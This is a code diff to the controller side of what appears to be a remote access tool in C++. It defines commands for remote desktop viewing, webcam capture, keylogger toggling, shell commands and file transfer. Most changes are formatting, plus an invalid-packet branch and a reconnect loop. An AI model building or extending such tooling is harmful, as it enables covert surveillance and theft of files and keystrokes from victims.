@@ -42,17 +42,17 @@ void rcv(NetworkHandlerClient NH) {
     DataType dt;
     cv::Mat image;
     INPUT in;
-    
-    NH.AddDataType("DesktopIMG",2);
+
+    NH.AddDataType("DesktopIMG", 2);
     NH.AddDataType("MousePos", 3);
-    NH.AddDataType("MouseDown",4);
+    NH.AddDataType("MouseDown", 4);
     NH.AddDataType("MouseUp", 4);
     NH.AddDataType("KeyDown", 5);
     NH.AddDataType("KeyUp", 6);
-    NH.AddDataType("CamIMG",7);
-    NH.AddDataType("SendFILE",8);
+    NH.AddDataType("CamIMG", 7);
+    NH.AddDataType("SendFILE", 8);
     NH.AddDataType("RecvFILE", 8);
-    NH.AddDataType("CMD",9);
+    NH.AddDataType("CMD", 9);
     NH.AddDataType("EnableLogger", 10);
     NH.AddDataType("DisableLogger", 11);
     //NH.AddDataType("", 3);
@@ -261,8 +261,8 @@ void rcv(NetworkHandlerClient NH) {
             NH.RecvFile(path);
         }
         else if (dt.Name == "RecvFILE") {
-        std::string path = NH.RecvDataT<std::string>();
-        NH.SendFile(path, 10000);
+            std::string path = NH.RecvDataT<std::string>();
+            NH.SendFile(path, 10000);
         }
         else if (dt.Name == "CMD") {
             string command = NH.RecvDataT<std::string>();
@@ -282,11 +282,11 @@ void rcv(NetworkHandlerClient NH) {
 
             cv::imshow(DesktopFeed, image); // Show our image inside the created window.
 
-        if (cv::waitKey(10) == 27)
-        {
-            cout << "Esc key is pressed by user. Stoppig the video" << endl;
-            cv::destroyWindow(DesktopFeed);
-        }
+            if (cv::waitKey(10) == 27)
+            {
+                cout << "Esc key is pressed by user. Stoppig the video" << endl;
+                cv::destroyWindow(DesktopFeed);
+            }
         }
         else if (dt.Name == "CamIMG") {
             NH.RecvCVMat(&image);
@@ -300,23 +300,37 @@ void rcv(NetworkHandlerClient NH) {
                 cv::destroyWindow(CamFeed);
             }
         }
-        
+        else if (dt.Name == "Invalid") {
+            printf("invalid packet type");
+        }
+        else {
+            printf("invalid packet type");
+        }
+
     }
 }
 
 int main()
 {
     thread recvThread;
-    if (NH.DefaultInitConnect()) {
-        Sleep(1000);
 
-        recvThread = thread(rcv, NH);
+    string input = "";
 
-        cv::namedWindow(CamFeed, cv::WINDOW_KEEPRATIO); // Create a window
-        NH.SendDataType("Invalid", 0);
+    while (true)
+    {
+        if (NH.DefaultInitConnect()) {
+            Sleep(1000);
 
+            recvThread = thread(rcv, NH);
+            cout << "enter command: ";
+            getline(cin, input);
 
-        system("pause");
+            cv::namedWindow(CamFeed, cv::WINDOW_KEEPRATIO); // Create a window
+            NH.SendDataType("Invalid", 0);
+
+        }
+        
     }
+    system("pause");
     return 0;
 }
